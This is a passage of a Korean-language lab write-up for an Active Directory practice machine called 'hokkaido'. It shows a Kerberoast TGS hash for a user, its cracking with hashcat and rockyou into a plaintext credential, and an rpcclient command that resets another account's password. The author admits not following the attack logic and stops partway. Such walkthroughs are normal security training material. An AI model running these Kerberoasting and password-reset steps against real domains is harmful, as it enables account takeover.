$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$97118d872379c9f4572caf27c57656d9$e392943f70d24a7199d72eb7efdea9f40a71ef7d5e8e048206b1509d56aa044b092d9a1be0322dd841c6ffd0e8eaf18ea05a8888ec26d62a9b1d20f7c5d6e3690cf656acd8fb7c3ae9bc27df0b40ae1210b1cd5118f8340efe45b3ae917208c293847453f6a5fae2c1fc489f54d8f0b976bd3f26e26808a2b2a2218d718b65b2716f292a40579ef65b81de77950ce109704b786bf08dd1fe1ecd92bd5d03af421841dc4ea8d8df36fd8d4f47473812191a0512823896fcc777d60ab58020e3a258b1bfd6d4eaf52be8dfd80c97572e1ea8cabacfd2438cb0bba2ea521f33c34047959f6c2276d365fea30bd49e8a78dde71e3be1ec6cee43402e51f00dab03581cdbf75409d603382440e7653a713e13a2e4acd1a3c3f8b0735d8c06e389e225eb421e6dab790254d818dd4eb127e175f5dfc897d78740177cfc7e4b6ce5db08ae29d75db5a19e9e75c7d0ae6285fc585d4e926017414100c5eeb5dd78e9457251fd7e8ada16d3ead195d5c6c3a4b310053fc7a15a8bd80537cb62383fa7d4f7eabfb93309dd83cb225b36dc5d69224be21d5f36067364edc19a931822f2a1b84602f48e7a14d3bce3fd203e4481189e444f128d15e3647fc200cc47bbd450dbfbd6b197851773dff49c6541ea43871af337fe2dbf5edc08dcf94f074a0b6b853eed614a99154ed8c5bf2e45fb1f16481e71426b3fe9cbe7363cb195115bac3ba9242da06155b0c225770dd0a468782c2dc75461bd9af52d497a747b995d2a99a2210e4e2aea5f21d32d314570a41e9e96e7f148926b745cfcae5178628cb6a2a84f948aefb1d6c5ae2388baae0a0097ba1c0c3c469285d9a1e56758c36156c1f1f836a2d6663c976e1cf758ca0490b385220ac662b0ec6df503a8ec95a2f22fa3131e85ee9d1d10a8e3e6477ad887cef918a38ea5c127bd8e6582fecf25d5ee352a67b70602b65af59601f9fd67189a1eb1a8b335124fd46bddb8f531a8e437704f3c1bf061de1d65c0c86bf978b5aa438cfd64f969c9defe59e5259aa3fa0c5d2ae6c8db003b8de73ee4635cd11d78ec93ad3c75e4f3c5be1cf6b909c498e81128f0e5fe16c41b7a39a3f51a4321264f839bd2ca4eb09299df9502779b36d4a5ef71b8c0f6fbf2a8c615405d409958081cc801229a9c5d790a25b3848bb355f96393f1ff2f475dd6e3b92551609c0e5e087472511483b4486ddfbaca46c2068b4a37401d03524f3f88ac7e7d228d0c1c433144c8cd2851b6ce380857986fc24a8d93a2bdb215b7661ab5d15ae46a01d8957c123b5aab33946339e9180e31103361c8344b049a81c2774f6e60170d7c2e9694d0dad2efcf33c94a7b35a4bb7845e9d367b6962ab4e8a472ab0b9c0710f5f845a32cc148e10d2f40fc472ca9377c9ab6b35565dda662fc606afacdd8bd42952b2d9f0d9f99e753ad7d4f5f1ee0065c1bde8a10b4fae9bc98c3d0e1c10e66c59707dc95e8e783448ac559ec80541dbf1102c6fe5724efde30b816c28932b715d1cfe4925acf13c282b9763dea9d493a9c34ac8d7d655b77a3cd1abb3ea2dfe33fe529b02925e491facec6b400c613da24903d33391c8ac7d1f43bcf05456aafc00d50e8d2ecae3c68c106435770d0c9edab587a2be2f123acce
[VERBOSE] SPN removed successfully for (Hazel.Green)

[...SNIP...]
```

hash 복호화를 통해 최종적으로 `Hazel.Green:haze1988` 의 크리덴셜을 확보할 수 있었다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# hashcat -m 13100 hazelgreen /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 2909/5883 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$97118d872379c9f4572caf27c57656d9$e392943f70d24a7199d72eb7efdea9f40a71ef7d5e8e048206b1509d56aa044b092d9a1be0322dd841c6ffd0e8eaf18ea05a8888ec26d62a9b1d20f7c5d6e3690cf656acd8fb7c3ae9bc27df0b40ae1210b1cd5118f8340efe45b3ae917208c293847453f6a5fae2c1fc489f54d8f0b976bd3f26e26808a2b2a2218d718b65b2716f292a40579ef65b81de77950ce109704b786bf08dd1fe1ecd92bd5d03af421841dc4ea8d8df36fd8d4f47473812191a0512823896fcc777d60ab58020e3a258b1bfd6d4eaf52be8dfd80c97572e1ea8cabacfd2438cb0bba2ea521f33c34047959f6c2276d365fea30bd49e8a78dde71e3be1ec6cee43402e51f00dab03581cdbf75409d603382440e7653a713e13a2e4acd1a3c3f8b0735d8c06e389e225eb421e6dab790254d818dd4eb127e175f5dfc897d78740177cfc7e4b6ce5db08ae29d75db5a19e9e75c7d0ae6285fc585d4e926017414100c5eeb5dd78e9457251fd7e8ada16d3ead195d5c6c3a4b310053fc7a15a8bd80537cb62383fa7d4f7eabfb93309dd83cb225b36dc5d69224be21d5f36067364edc19a931822f2a1b84602f48e7a14d3bce3fd203e4481189e444f128d15e3647fc200cc47bbd450dbfbd6b197851773dff49c6541ea43871af337fe2dbf5edc08dcf94f074a0b6b853eed614a99154ed8c5bf2e45fb1f16481e71426b3fe9cbe7363cb195115bac3ba9242da06155b0c225770dd0a468782c2dc75461bd9af52d497a747b995d2a99a2210e4e2aea5f21d32d314570a41e9e96e7f148926b745cfcae5178628cb6a2a84f948aefb1d6c5ae2388baae0a0097ba1c0c3c469285d9a1e56758c36156c1f1f836a2d6663c976e1cf758ca0490b385220ac662b0ec6df503a8ec95a2f22fa3131e85ee9d1d10a8e3e6477ad887cef918a38ea5c127bd8e6582fecf25d5ee352a67b70602b65af59601f9fd67189a1eb1a8b335124fd46bddb8f531a8e437704f3c1bf061de1d65c0c86bf978b5aa438cfd64f969c9defe59e5259aa3fa0c5d2ae6c8db003b8de73ee4635cd11d78ec93ad3c75e4f3c5be1cf6b909c498e81128f0e5fe16c41b7a39a3f51a4321264f839bd2ca4eb09299df9502779b36d4a5ef71b8c0f6fbf2a8c615405d409958081cc801229a9c5d790a25b3848bb355f96393f1ff2f475dd6e3b92551609c0e5e087472511483b4486ddfbaca46c2068b4a37401d03524f3f88ac7e7d228d0c1c433144c8cd2851b6ce380857986fc24a8d93a2bdb215b7661ab5d15ae46a01d8957c123b5aab33946339e9180e31103361c8344b049a81c2774f6e60170d7c2e9694d0dad2efcf33c94a7b35a4bb7845e9d367b6962ab4e8a472ab0b9c0710f5f845a32cc148e10d2f40fc472ca9377c9ab6b35565dda662fc606afacdd8bd42952b2d9f0d9f99e753ad7d4f5f1ee0065c1bde8a10b4fae9bc98c3d0e1c10e66c59707dc95e8e783448ac559ec80541dbf1102c6fe5724efde30b816c28932b715d1cfe4925acf13c282b9763dea9d493a9c34ac8d7d655b77a3cd1abb3ea2dfe33fe529b02925e491facec6b400c613da24903d33391c8ac7d1f43bcf05456aafc00d50e8d2ecae3c68c106435770d0c9edab587a2be2f123acce:haze1988

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hok...23acce
Time.Started.....: Sat Feb 14 15:53:34 2026 (2 secs)
Time.Estimated...: Sat Feb 14 15:53:36 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3190.2 kH/s (0.49ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7661568/14344385 (53.41%)
Rejected.........: 0/7661568 (0.00%)
Restore.Point....: 7659520/14344385 (53.40%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: hazlam -> hayward10
Hardware.Mon.#1..: Util: 82%

Started: Sat Feb 14 15:53:33 2026
Stopped: Sat Feb 14 15:53:38 2026
```


내부 이야기 생략 ... 

hazel.green 을 통해서 molly.smith 계정에 대해 rpcclient 로 비밀번호 변경이 된다는 거를 알 수 있다는데 그 논리가 다른 자료들에서 이해가 안 돼서 넘어간다. 

## 2.3. rpcclient 를 통한 molly.green 비밀번호 변경

`rpcclient` 를 통해서 `molly.green` 의 비밀번호를 변경한다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# rpcclient -N $IP -U 'hazel.green%haze1988'
rpcclient $> setuserinfo2 MOLLY.SMITH 23 'Password123@'
```

여기서도 이해가 안 가는게 `molly.green` 은 `xfreerdp` 를 통해 들어 갔을 때도 권한이 없는데, 다른 곳에서는 백업 권한이 있으니까 `SAM` 파일을 백업하라고 한다. 이해할 수 없다.

![](../images/WindowsAD-03.%20hokkaido-2.png)

이해 안 되는 것들 투성이인 실습이라 그냥 여기까지 한다.